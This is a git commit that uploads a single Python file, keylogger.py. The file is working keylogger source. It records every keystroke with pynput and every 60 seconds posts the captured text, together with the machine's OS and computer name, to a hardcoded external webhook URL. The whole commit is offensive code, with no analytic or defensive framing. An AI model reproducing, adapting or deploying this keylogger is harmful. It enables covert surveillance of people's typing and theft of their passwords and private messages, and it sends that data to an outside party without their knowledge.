1d1aa4637160df646350f4045b5fffd157af9391
Mishal <70484516+mishalshanavas@users.noreply.github.com>
2022-10-23 16:24:52 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,51 @@
+from pynput import keyboard
+import requests
+import os
+
+import json
+import threading
+
+text = ""
+time_interval = 60
+webhook_url = 'https://api.reliablewebhook.com/h/27iibas5ckmikdjq'
+osname = os.name
+pc = os.getenv('COMPUTERNAME')
+
+
+def send_post_req():
+    
+    payload   = json.dumps({"os" : osname + pc , "keyboardData" : text})
+    r = requests.post(webhook_url, data = payload , headers={'Content-Type': 'application/json'},timeout=5)
+    timer = threading.Timer(time_interval, send_post_req)
+    timer.start()
+
+
+def on_press(key):
+    global text
+
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
+        text += str(key).strip("'")
+
+
+
+with keyboard.Listener(on_press=on_press) as listener:
+     
+    send_post_req()
+    listener.join()
